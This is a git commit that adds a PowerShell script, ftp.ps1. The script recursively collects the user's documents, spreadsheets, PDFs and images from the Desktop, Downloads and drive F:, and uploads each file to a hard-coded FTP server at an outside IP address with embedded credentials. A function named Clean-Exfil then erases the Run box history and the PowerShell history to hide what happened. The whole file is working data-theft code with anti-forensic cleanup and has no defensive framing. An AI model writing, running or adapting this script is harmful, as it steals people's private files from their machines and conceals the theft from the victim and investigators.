5551851fa7c3ec9920320e0b14659b31ecdf42dc
louist12 <114141279+louist12@users.noreply.github.com>
2022-11-01 02:04:16 -0400

    Add files via upload

---
+++ ftp.ps1
@@ -0,0 +1,17 @@
+﻿$web=New-Object System.Net.WebClient
+$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
+$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
+
+foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
+    $URI = New-Object System.Uri($FTP+$item.Name)
+    $web.UploadFile($URI, $item.FullName)
+}
+function Clean-Exfil{
+
+	#delete run box history
+	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+	
+	#delete powershell history
+	Remove-Item (Get-PSreadlineOption).HistorySavePath
+}
+Clean-Exfil
